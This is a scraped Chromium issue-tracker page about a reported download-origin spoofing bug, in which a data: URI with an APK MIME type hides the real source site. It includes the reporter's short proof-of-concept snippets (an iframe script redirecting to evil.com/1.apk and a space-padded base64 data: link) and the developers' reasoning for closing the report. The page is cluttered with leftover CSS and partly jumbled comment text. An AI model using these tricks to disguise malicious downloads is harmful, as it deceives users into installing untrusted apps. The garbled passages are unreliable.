        There have been a bunch of ideas suggested by the reporter. I will try to summarize them<span class="line"><!---->There have been a bunch of ideas suggested by the reporter. I will try to summarize them<!----></span><br><br>1) Misleading filename in <span class="line"><!---->1) Misleading filename in <!----></span>#c17<a class="undefined" target="_blank" href="#c17"><!---->#c17<!----></a> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<span class="line"><!----> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<!----></span><br><br>2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <span class="line"><!---->2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <!----></span>issue 594215<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=594215" title="Disable page-initiated main frame navigations to data URLs"><!---->issue 594215<!----></a>. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <span class="line"><!---->. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <!----></span>https://bayden.com/test/data.htm<a class="undefined" target="_blank" href="https://bayden.com/test/data.htm"><!---->https://bayden.com/test/data.htm<!----></a>,<span class="line"><!---->,<!----></span> right click and open a data URI page in a new tab.<span class="line"><!----> right click and open a data URI page in a new tab.<!----></span><br>I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<span class="line"><!---->I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<!----></span><br><br>3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<span class="line"><!---->3) Not displaying the origin of the website in chrome://downloads. As Min pointed out, we do display the origin of the download, which is the data: URI and is accurate. Changing that adds questionable benefit to security, as the user is likely to open the download without visiting chrome://downloads, and further reporting a URI not of the download, but of the website might just confuse the user.<!----></span><br><br>In light of this discussion, I am marking this bug as working as intended.<span class="line"><!---->In light of this discussion, I am marking this bug as working as intended.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">

      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;

          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;

            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }

            min-width: auto;

            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

  :host {
    --mr-edit-field-padding: 0.125em 4px;

  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;

 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }

 }
 }
 });

    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }
      </style>

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }

    padding: var(--chops-button-padding);

          Issue tracker keyboard shortcuts
          
            Close

        <h2>
          Issue tracker keyboard shortcuts
          <button class="close-button">
            Close
          </button>
        </h2>

          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.
        <p>
          Note: Only signed in users can star issues or add comments, and
          only project members can select issues for bulk edits.
        </p>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>
      
          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          </chops-button>

          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

      ---<span class="line"><!---->---<!----></span><br><br>### Report description<span class="line"><!---->### Report description<!----></span><br><br><br>Insufficient policy enforcement in data URI block leads to incorrect security UI in Downloads<span class="line"><!---->Insufficient policy enforcement in data URI block leads to incorrect security UI in Downloads<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### Bug location<span class="line"><!---->### Bug location<!----></span><br><br><br>#### Which product or website have you found a vulnerability in?<span class="line"><!---->#### Which product or website have you found a vulnerability in?<!----></span><br><br>Google Chrome<span class="line"><!---->Google Chrome<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The problem<span class="line"><!---->### The problem<!----></span><br><br><br>#### Please describe the technical details of the vulnerability<span class="line"><!---->#### Please describe the technical details of the vulnerability<!----></span><br><br>Hi team,<span class="line"><!---->Hi team,<!----></span><br><br>This is a re-submit of <span class="line"><!---->This is a re-submit of <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>.<span class="line"><!---->.<!----></span><br><br>I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <span class="line"><!---->I will explain in detail what is the difference between #1305184 and #121259 according to the email tips from <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a>.<span class="line"><!---->.<!----></span><br><br><br><br>Reproduce steps:<span class="line"><!---->Reproduce steps:<!----></span><br><br>Visit <span class="line"><!---->Visit <!----></span>https://ybt01.github.io/poc/son.html<a class="undefined" target="_blank" href="https://ybt01.github.io/poc/son.html"><!---->https://ybt01.github.io/poc/son.html<!----></a> and click link on webpage or host the attached poc.html in your own server.<span class="line"><!----> and click link on webpage or host the attached poc.html in your own server.<!----></span><br><br><br><br>The differences:<span class="line"><!---->The differences:<!----></span><br><br>1)#121259 means an attacker could spoof a file download dialog on any domains like<span class="line"><!---->1)#121259 means an attacker could spoof a file download dialog on any domains like<!----></span> <span class="line"><!----> <!----></span>google.com<a class="undefined" target="_blank" href="https://google.com"><!---->google.com<!----></a>, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<span class="line"><!---->, chrome need add an origin tip to file download dialog, you can see the detail description of #725084 and #1194554.<!----></span><br><br>I just want to make the attack scenario more real, so I used window.open("<span class="line"><!---->I just want to make the attack scenario more real, so I used window.open("<!----></span>https://abc.xyz<a class="undefined" target="_blank" href="https://abc.xyz"><!---->https://abc.xyz<!----></a>")<span class="line"><!---->")<!----></span> in my <span class="line"><!----> in my <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a>'s PoC, the root cause of #1305184 has no relation with #121259.<span class="line"><!---->'s PoC, the root cause of #1305184 has no relation with #121259.<!----></span><br><br><br>2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<span class="line"><!---->2)The core problem is chrome doesn't allow navigate top frame to data URL under normal scenarios.<!----></span><br>For example:<span class="line"><!---->For example:<!----></span><br>```<span class="line"><!---->```<!----></span><br><a href="data:text/html,xxx">click me</a> //this will be blocked<span class="line"><!---->&lt;a href="data:text/html,xxx"&gt;click me&lt;/a&gt; //this will be blocked<!----></span><br>```<span class="line"><!---->```<!----></span><br>But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<span class="line"><!---->But chrome doesn't block the navigation when we set mime type of data URI to "application/vnd.android.package-archive application/gz ...", instead chrome think it is a file download request.<!----></span><br><br>3)My <span class="line"><!---->3)My <!----></span>issue #1305184<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1305184" title="Incorrect UI in Downloads via data scheme"><!---->issue #1305184<!----></a> <span class="line"><!----> <!----></span>has the same principle with my previous fixed <span class="line"><!---->has the same principle with my previous fixed <!----></span>issues <span class="line"><!---->issues <!----></span>#1213350<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1213350" title="Security: Incorrect Security UI in downloads"><!---->#1213350<!----></a> and <span class="line"><!----> and <!----></span>#1157743<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1157743" title="Security: spoof download on any websites"><!---->#1157743<!----></a>.<span class="line"><!---->.<!----></span><br><br>#1213350: chrome show origin "about:srcdoc" instead of the real origin "<span class="line"><!---->#1213350: chrome show origin "about:srcdoc" instead of the real origin "<!----></span>http://evil.com<a class="undefined" target="_blank" href="http://evil.com"><!---->http://evil.com<!----></a>"<span class="line"><!---->"<!----></span><br>```<span class="line"><!---->```<!----></span><br><iframe srcdoc="<script>document.location='<span class="line"><!---->&lt;iframe srcdoc="&lt;script&gt;document.location='<!----></span>http://evil.com/1.apk<a class="undefined" target="_blank" href="http://evil.com/1.apk"><!---->http://evil.com/1.apk<!----></a>'<span class="line"><!---->'<!----></span></script>"></iframe><span class="line"><!---->&lt;/script&gt;"&gt;&lt;/iframe&gt;<!----></span><br><br>```<span class="line"><!---->```<!----></span><br><br>#1305184: chrome show origin "data:..." instead of the real origin "http:s//ybt01.github.io"<span class="line"><!---->#1305184: chrome show origin "data:..." instead of the real origin "http:s//ybt01.github.io"<!----></span><br>```<span class="line"><!---->```<!----></span><br><a id="a1" href="data:                                                      application/vnd.android.package-archive;base64,UEsDBBQACAgIAJdibEYXK8+ZngQAAHQPAAATAAQAQW5kcm9pZE1hbml>click me</a><span class="line"><!---->&lt;a id="a1" href="data:                                                      application/vnd.android.package-archive;base64,UEsDBBQACAgIAJdibEYXK8+ZngQAAHQPAAATAAQAQW5kcm9pZE1hbml&gt;click me&lt;/a&gt;<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>4)The patch is different:<span class="line"><!---->4)The patch is different:<!----></span><br><br>- #1305184 need block navigate top frame to data:application/vnd.android.package-archive, application/gz and the like.<span class="line"><!---->- #1305184 need block navigate top frame to data:application/vnd.android.package-archive, application/gz and the like.<!----></span><br>- Show the real origin "<span class="line"><!---->- Show the real origin "<!----></span>https://ybt01.github.io<a class="undefined" target="_blank" href="https://ybt01.github.io"><!---->https://ybt01.github.io<!----></a>"<span class="line"><!---->"<!----></span> instead "data:..." in chrome://downloads page, the patch location maybe at /chrome/browser/download/android/download_manager_service.cc <span class="line"><!----> instead "data:..." in chrome://downloads page, the patch location maybe at /chrome/browser/download/android/download_manager_service.cc <!----></span><br><br><br>#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so<span class="line"><!---->#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so<!----></span><br><br>remote attacker<span class="line"><!---->remote attacker<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The cause<span class="line"><!---->### The cause<!----></span><br><br><br>#### What version of Chrome have you found the security issue in?<span class="line"><!---->#### What version of Chrome have you found the security issue in?<!----></span><br><br>101.0.4934.0+cannary+android<span class="line"><!---->101.0.4934.0+cannary+android<!----></span><br><br><br>#### Is the security issue related to a crash?<span class="line"><!---->#### Is the security issue related to a crash?<!----></span><br><br>No<span class="line"><!---->No<!----></span><br><br><br>#### Choose the type of vulnerability<span class="line"><!---->#### Choose the type of vulnerability<!----></span><br><br>Security UI Spoofing<span class="line"><!---->Security UI Spoofing<!----></span><br><br><br>#### How would you like to be publicly acknowledged for your report?<span           Comment 3<a class="comment-link" href="?id=1305698#c3">Comment 3<!----></a>

          
        by

          <a class="comment-link" href="?id=1305698#c10">Comment 10<!----></a>

        Hi @qinmin and @bookholt,<span class="line"><!---->Hi @qinmin and @bookholt,<!----></span><br><br>My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<span class="line"><!---->My first sugggestion is that chrome shouldn't treat any data URI with executable MIMIE type(application/xxx) as file download requests, victims are likely to think that such a download URI "data:..." is trusted, because it doesn't contain any intuitive domains or IPs.<!----></span><br>- application/vnd.android.package-archive (for apk)<span class="line"><!---->- application/vnd.android.package-archive (for apk)<!----></span><br>- application/vnd.microsoft.portable-executable (for exe)<span class="line"><!---->- application/vnd.microsoft.portable-executable (for exe)<!----></span><br>- application/octet-stream (for bin/dmg)<span class="line"><!---->- application/octet-stream (for bin/dmg)<!----></span><br>...<span class="line"><!---->...<!----></span><br><br>And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<span class="line"><!---->And the 2nd sugggestion, chrome for android needs remove the space chars in download origin.<!----></span><mr-comment-content></mr-comment-content>

        I am wondering whether this should be something safebrowsing should do instead of download. <span class="line"><!---->I am wondering whether this should be something safebrowsing should do instead of download. <!----></span><br>Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download. As for the url or file content, safebrowsing has deep scans and can check whether the URL is frequently downloaded.<!----></span><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page. So blocking the data URI doesn't increase user awareness of the insecure URL, or make it harder for attackers to trick user  to think that he is downloading something safing.<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>

        If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<span class="line"><!---->If there is a download happening, safebrowsing is probably already checking it and scanning whenever applicable. I can verify that though.<!----></span><br><br>I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<span class="line"><!---->I think if data URLs are being blocked for navigation because they can confuse users, data URLs should be blocked from downloading too. We can probably find out if this is a bug or a deliberate choice.<!----></span><br><br>As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<span class="line"><!---->As for the URI address shown on the chrome://downloads, showing "data:" seems fine to me, as that is the source of the download.<!----></span><mr-comment-content></mr-comment-content>

        For <span class="line"><!---->For <!----></span>comment#11<a class="undefined" target="_blank" href="#c11"><!---->comment#11<!----></a>:<span class="line"><!---->:<!----></span><br><br>Download already shows a dangerous warning for apk or exe download.<span class="line"><!---->Download already shows a dangerous warning for apk or exe download.<!----></span><br>-------------------------------<span class="line"><!---->-------------------------------<!----></span><br>Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<span class="line"><!---->Chrome shows a dangerous warning for all apks download even if we download google play apk or download from some popular website like zoom.us. So this warning is meaningless in thie current scenario.<!----></span><br><br><br>Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<span class="line"><!---->Another rationale is that after downloading a file, not a lot users today actually check the download URL today or go to download page.<!----></span><br>-----------------------<span class="line"><!---->-----------------------<!----></span><br>For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<span class="line"><!---->For desktop chrome, I admit users don't always check the download URL or go to download page, but when we download an installable apk file in android, users are very likely to click the file in the download page for installation.<!----></span><mr-comment-content></mr-comment-content>

        Regarding #17, as I said, blocking data URI download doesn't make user safer:<span class="line"><!---->Regarding #17, as I said, blocking data URI download doesn't make user safer:<!----></span><br>1. most users don't go to download home to launch apk.<span class="line"><!---->1. most users don't go to download home to launch apk.<!----></span><br>2. And there is no need to use data URI to trick users.<span class="line"><!---->" that uses capitalized "i" instead of "l". And there is no need to use data URI to trick users.<!----></span><br><br>The dangerous download dialog already presents a warning to users.  And hopefully things like deep scanning or safe browsing can detect malicious apks in the future. So I don't feel like blocking web standards is the right solution.<span class="line"><!---->The dangerous download dialog already presents a warning to users.         Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<span class="line"><!---->Personally I think download scanning or download URL checking are much safer than blocking. Download scanning can prevent the use of similar URL cases above (so it can also handle non-data URL), and protects users who never uses download page or pays attention to download URLs.<!----></span><br> <span class="line"><!----> <!----></span><br>That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<span class="line"><!---->That's why I think this should be done in safe browsing rather than download. Another thing we could do is to warn user about data URL and blob URL in dangerous download dialog that they cannot be trusted, so users don't rely on download homes can know about the security risk<!----></span><mr-comment-content></mr-comment-content>

        There have been a bunch of ideas suggested by the reporter. I will try to summarize them<span class="line"><!---->There have been a bunch of ideas suggested by the reporter. I will try to summarize them<!----></span><br><br>1) Misleading filename in <span class="line"><!---->1) Misleading filename in <!----></span>#c17<a class="undefined" target="_blank" href="#c17"><!---->#c17<!----></a> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<span class="line"><!----> to confuse the user about the origin of the download. This is something that can be a duplicate for the new downloads UX work, where the filename stands out prominently, and is not a part of a sentence that can be misleading.<!----></span><br><br>2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <span class="line"><!---->2) Using data: URI for initiating a download. I think this is deliberately allowed, and is not a oversight or a bug, see <!----></span>issue 594215<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=594215" title="Disable page-initiated main frame navigations to data URLs"><!---->issue 594215<!----></a>. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <span class="line"><!---->. Infact even navigation to data: URI in a new tab is allowed, replicate by visiting <!----></span>https://bayden.com/test/data.htm<a class="undefined" target="_blank" href="https://bayden.com/test/data.htm"><!---->https://bayden.com/test/data.htm<!----></a>,<span class="line"><!---->,<!----></span> right click and open a data URI page in a new tab.<span class="line"><!----> right click and open a data URI page in a new tab.<!----></span><br>I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<span class="line"><!---->I do not think banning data: URI for downloads, even if just for executables can be considered till there is data backing up about the prevelance of this mechanism, its ability to bypass safe browsing checks, and the impact on the browsing experience if websites cannot use data: URI for downloads.<!----></span><br><br>3) Not displaying the origin of the website in chrome://downloads. As 